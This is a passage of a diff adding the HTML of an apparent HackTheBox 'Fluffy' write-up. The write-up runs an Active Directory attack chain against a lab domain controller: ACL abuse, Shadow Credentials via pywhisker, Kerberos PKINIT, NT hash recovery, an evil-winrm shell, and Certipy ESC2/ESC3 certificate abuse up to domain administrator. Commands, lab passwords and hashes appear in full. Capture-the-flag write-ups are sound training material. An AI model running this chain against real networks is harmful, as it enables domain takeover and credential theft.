+	srcset="/post/hackthebox-fluffy/Images/sa_gw_hu_6b91276f4fce1bb9.png 480w, /post/hackthebox-fluffy/Images/sa_gw_hu_20e3607f7c9f90ff.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="260"
+		data-flex-basis="624px"
+	
+></p>
+<h3 id="abusing-acl-genericall--genericwrite">Abusing ACL GenericAll &amp; GenericWrite
+</h3><p>We can leverage this permission chain like so:</p>
+<ol>
+<li>Leverage GenericAll to add our own user to &ldquo;Service Accounts&rdquo; group</li>
+<li>Leverage the GenericWrite permission of Service Accounts to perform a Shadow Credentials attack, where we write our own authorizing keys to act as password-less authentication as the impacted user without ever knowing the end user&rsquo;s credentials.</li>
+</ol>
+<p>First, the command to add our user to the Service Accounts group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net rpc group addmem &#34;Service Accounts&#34; &#34;p.agila&#34; -U &#34;FLUFFY.HTB&#34;/&#34;p.agila&#34;%&#34;prometheusx-303&#34; -S &#34;DC01.FLUFFY.HTB&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next using <code>pywhisker</code> to add shadow credentials to the user <code>winrm_svc</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">fluffy</span><span class="o">/</span><span class="n">pywhisker</span><span class="o">/</span><span class="n">pywhisker</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">python</span> <span class="n">pywhisker</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">d</span> <span class="s2">&#34;fluffy.htb&#34;</span> <span class="o">-</span><span class="n">u</span> <span class="s2">&#34;p.agila&#34;</span> <span class="o">-</span><span class="n">p</span> <span class="s2">&#34;prometheusx-303&#34;</span> <span class="o">--</span><span class="n">target</span> <span class="s2">&#34;winrm_svc&#34;</span> <span class="o">--</span><span class="n">action</span> <span class="s2">&#34;add&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="n">the</span> <span class="n">target</span> <span class="n">account</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">user</span> <span class="n">found</span><span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">winrm</span> <span class="n">service</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">fluffy</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">certificate</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">generated</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">KeyCredential</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">KeyCredential</span> <span class="n">generated</span> <span class="n">with</span> <span class="n">DeviceID</span><span class="p">:</span> <span class="mi">41</span><span class="n">f61c16</span><span class="o">-</span><span class="mi">60</span><span class="n">f5</span><span class="o">-</span><span class="n">ebab</span><span class="o">-</span><span class="mi">3009</span><span class="o">-</span><span class="mi">4</span><span class="n">eb63f3ea5c4</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Updating</span> <span class="n">the</span> <span class="n">msDS</span><span class="o">-</span><span class="n">KeyCredentialLink</span> <span class="n">attribute</span> <span class="n">of</span> <span class="n">winrm_svc</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Updated</span> <span class="n">the</span> <span class="n">msDS</span><span class="o">-</span><span class="n">KeyCredentialLink</span> <span class="n">attribute</span> <span class="n">of</span> <span class="n">the</span> <span class="n">target</span> <span class="n">object</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Converting</span> <span class="n">PEM</span> <span class="o">-&gt;</span> <span class="n">PFX</span> <span class="n">with</span> <span class="n">cryptography</span><span class="p">:</span> <span class="n">NoeZBvAv</span><span class="o">.</span><span class="n">pfx</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PFX</span> <span class="n">exportiert</span> <span class="n">nach</span><span class="p">:</span> <span class="n">NoeZBvAv</span><span class="o">.</span><span class="n">pfx</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="n">Passwort</span> <span class="n">für</span> <span class="n">PFX</span><span class="p">:</span> <span class="n">uruhNsn2plK16O5RxW4S</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">PFX</span> <span class="p">(</span><span class="c1">#PKCS12) certificate &amp; key at path: NoeZBvAv.pfx</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Must</span> <span class="n">be</span> <span class="n">used</span> <span class="n">with</span> <span class="n">password</span><span class="p">:</span> <span class="n">uruhNsn2plK16O5RxW4S</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">A</span> <span class="n">TGT</span> <span class="n">can</span> <span class="n">now</span> <span class="n">be</span> <span class="n">obtained</span> <span class="n">with</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">dirkjanm</span><span class="o">/</span><span class="n">PKINITtools</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With the certificates we can generate krb5ccname for Kerberos authentication:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">fluffy</span><span class="o">/</span><span class="n">PKINITtools</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">python</span> <span class="n">gettgtpkinit</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">cert</span><span class="o">-</span><span class="n">pfx</span> <span class="o">../</span><span class="n">pywhisker</span><span class="o">/</span><span class="n">pywhisker</span><span class="o">/</span><span class="n">NoeZBvAv</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">pfx</span><span class="o">-</span><span class="k">pass</span> <span class="n">uruhNsn2plK16O5RxW4S</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">246.193</span> <span class="n">fluffy</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">winrm_svc</span> <span class="n">out</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">25</span> <span class="mi">20</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">38</span><span class="p">,</span><span class="mi">218</span> <span class="n">minikerberos</span> <span class="n">INFO</span>     <span class="n">Loading</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">key</span> <span class="n">from</span> <span class="n">file</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span><span class="n">minikerberos</span><span class="p">:</span><span class="n">Loading</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">key</span> <span class="n">from</span> <span class="n">file</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">25</span> <span class="mi">20</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">38</span><span class="p">,</span><span class="mi">229</span> <span class="n">minikerberos</span> <span class="n">INFO</span>     <span class="n">Requesting</span> <span class="n">TGT</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span><span class="n">minikerberos</span><span class="p">:</span><span class="n">Requesting</span> <span class="n">TGT</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">25</span> <span class="mi">20</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="mi">530</span> <span class="n">minikerberos</span> <span class="n">INFO</span>     <span class="n">AS</span><span class="o">-</span><span class="n">REP</span> <span class="n">encryption</span> <span class="n">key</span> <span class="p">(</span><span class="n">you</span> <span class="n">might</span> <span class="n">need</span> <span class="n">this</span> <span class="n">later</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span><span class="n">minikerberos</span><span class="p">:</span><span class="n">AS</span><span class="o">-</span><span class="n">REP</span> <span class="n">encryption</span> <span class="n">key</span> <span class="p">(</span><span class="n">you</span> <span class="n">might</span> <span class="n">need</span> <span class="n">this</span> <span class="n">later</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">25</span> <span class="mi">20</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="mi">530</span> <span class="n">minikerberos</span> <span class="n">INFO</span>     <span class="mi">7290</span><span class="n">ccf8ee6b6bdf789380a86513e9210bdc0ac5ada7e2fa15e458d8c4d4456d</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span><span class="n">minikerberos</span><span class="p">:</span><span class="mi">7290</span><span class="n">ccf8ee6b6bdf789380a86513e9210bdc0ac5ada7e2fa15e458d8c4d4456d</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">25</span> <span class="mi">20</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="mi">532</span> <span class="n">minikerberos</span> <span class="n">INFO</span>     <span class="n">Saved</span> <span class="n">TGT</span> <span class="n">to</span> <span class="n">file</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span><span class="n">minikerberos</span><span class="p">:</span><span class="n">Saved</span> <span class="n">TGT</span> <span class="n">to</span> <span class="n">file</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Export it to my env:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">fluffy</span><span class="o">/</span><span class="n">PKINITtools</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="k">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">out</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Last, we can use <code>getnthash</code> to get the NT hash for NTLM authentication:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">fluffy</span><span class="o">/</span><span class="n">PKINITtools</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">python</span> <span class="n">getnthash</span><span class="o">.</span><span class="n">py</span> <span class="n">fluffy</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">winrm_svc</span> <span class="o">-</span><span class="n">key</span> <span class="mi">7290</span><span class="n">ccf8ee6b6bdf789380a86513e9210bdc0ac5ada7e2fa15e458d8c4d4456d</span>
+</span></span><span class="line"><span class="cl"><span class="n">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mf">13.0</span><span class="o">.</span><span class="n">dev0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">TGT</span> <span class="n">from</span> <span class="n">cache</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">ticket</span> <span class="n">to</span> <span class="bp">self</span> <span class="n">with</span> <span class="n">PAC</span>
+</span></span><span class="line"><span class="cl"><span class="n">Recovered</span> <span class="n">NT</span> <span class="n">Hash</span>
+</span></span><span class="line"><span class="cl"><span class="mi">33</span><span class="n">bd09dcd697600edf6b3a7af4875767</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally we can use evil-winrm to access the system remotely:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -i fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can repeat the same steps for the other service accounts as well.</p>
+<ul>
+<li>ca_svc hash: ca0f4f9e9eb8a092addf53bb03fc98c8</li>
+<li>ldap_svc hash: 22151d74ba3de931a352cba1f9393a37</li>
+</ul>
+<h2 id="privilege-escalation">Privilege Escalation
+</h2><h3 id="enumerating-adcs-with-certipy">Enumerating ADCS with Certipy
+</h3><p>Note: the next section requires use of <code>certipy</code>, however the installed version of 5.0.1 in kali was having issues performing the attack chain. As such, I created a venv of certipy for the latest 5.0.2 version.</p>
+<p>Create and activate a virtual environment:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 -m venv certipy-venv
+</span></span><span class="line"><span class="cl"><span class="nb">source</span> certipy-venv/bin/activate
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>First enumerate certificate templates:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(certipy-venv)─(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ certipy find -username ca_svc@fluffy.htb -hashes &#39;ca0f4f9e9eb8a092addf53bb03fc98c8&#39; -dc-ip 10.10.11.69
+</span></span><span class="line"><span class="cl">Certipy v5.0.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">[*] Saving text output to &#39;20250527044711_Certipy.txt&#39;
+</span></span><span class="line"><span class="cl">[*] Wrote text output to &#39;20250527044711_Certipy.txt&#39;
+</span></span><span class="line"><span class="cl">[*] Saving JSON output to &#39;20250527044711_Certipy.json&#39;
+</span></span><span class="line"><span class="cl">[*] Wrote JSON output to &#39;20250527044711_Certipy.json&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="leveraging-certipy-to-abuse-esc2esc3">Leveraging Certipy to abuse ESC2+ESC3
+</h3><p>From the output, we can see Certificate 32 is vulnerable to ESC2+ESC3:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl">    <span class="s2">&#34;32&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;Template Name&#34;</span><span class="p">:</span> <span class="s2">&#34;User&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;Display Name&#34;</span><span class="p">:</span> <span class="s2">&#34;User&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;Certificate Authorities&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;fluffy-DC01-CA&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">],</span>
+</span></span><span class="line"><span class="cl"> <span class="err">&lt;...SNIP...&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;[+] User Enrollable Principals&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;FLUFFY.HTB\\Domain Users&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">],</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;[*] Remarks&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;ESC2 Target Template&#34;</span><span class="p">:</span> <span class="s2">&#34;Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;ESC3 Target Template&#34;</span><span class="p">:</span> <span class="s2">&#34;Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The wiki mentioned is the following: <a class="link" href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation"  target="_blank" rel="noopener"
+    >https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation</a></p>
+<p>First, update our user account <code>ca_svc</code> with the Administrator upn:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(certipy-venv)─(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ certipy account -u &#39;ca_svc@fluffy.htb&#39; -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -user &#39;ca_svc&#39; -upn &#39;administrator&#39; update
+</span></span><span class="line"><span class="cl">Certipy v5.0.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Updating user &#39;ca_svc&#39;:
+</span></span><span class="line"><span class="cl">    userPrincipalName                   : administrator
+</span></span><span class="line"><span class="cl">[*] Successfully updated &#39;ca_svc&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next requesting the &ldquo;Any Purpose&rdquo; certificate:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(certipy-venv)─(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ certipy req -u &#39;ca_svc@fluffy.htb&#39; -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target fluffy.htb -ca &#34;fluffy-DC01-CA&#34; -template &#39;User&#39;
+</span></span><span class="line"><span class="cl">Certipy v5.0.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Requesting certificate via RPC
+</span></span><span class="line"><span class="cl">[*] Request ID is 17
+</span></span><span class="line"><span class="cl">[*] Successfully requested certificate
+</span></span><span class="line"><span class="cl">[*] Got certificate with UPN &#39;administrator&#39;
+</span></span><span class="line"><span class="cl">[*] Certificate has no object SID
+</span></span><span class="line"><span class="cl">[*] Try using -sid to set the object SID or see the wiki for more details
+</span></span><span class="line"><span class="cl">[*] Saving certificate and private key to &#39;administrator.pfx&#39;
+</span></span><span class="line"><span class="cl">[*] Wrote certificate and private key to &#39;administrator.pfx&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we need to un-update our user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(certipy-venv)─(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ certipy account -u &#39;ca_svc@fluffy.htb&#39; -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -user &#39;ca_svc&#39; -upn &#39;administrator&#39; update
+</span></span><span class="line"><span class="cl">Certipy v5.0.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Updating user &#39;ca_svc&#39;:
+</span></span><span class="line"><span class="cl">    userPrincipalName                   : ca_svc
+</span></span><span class="line"><span class="cl">[*] Successfully updated &#39;ca_svc&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, requesting a certificate on behalf of the Administrator:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(certipy-venv)─(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username &#39;administrator&#39; -domain &#39;fluffy.htb&#39;
+</span></span><span class="line"><span class="cl">Certipy v5.0.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Certificate identities:
+</span></span><span class="line"><span class="cl">[*]     SAN UPN: &#39;administrator&#39;
+</span></span><span class="line"><span class="cl">[*] Using principal: &#39;administrator@fluffy.htb&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to get TGT...
+</span></span><span class="line"><span class="cl">[*] Got TGT
+</span></span><span class="line"><span class="cl">[*] Saving credential cache to &#39;administrator.ccache&#39;
+</span></span><span class="line"><span class="cl">[*] Wrote credential cache to &#39;administrator.ccache&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to retrieve NT hash for &#39;administrator&#39;
+</span></span><span class="line"><span class="cl">[*] Got hash for &#39;administrator@fluffy.htb&#39;: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can authenticate as admin!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(certipy-venv)─(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ nxc smb fluffy.htb -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e                                 
+</span></span><span class="line"><span class="cl">SMB         10.129.245.161  445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
+</span></span><span class="line"><span class="cl">SMB         10.129.245.161  445    DC01             [+] fluffy.htb\Administrator:8da83a3fa618b6e3a00e93f676c92a6e (Pwn3d!)
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/active-directory/">Active Directory</a>
+        
+            <a href="/tags/netexec/">Netexec</a>
+        
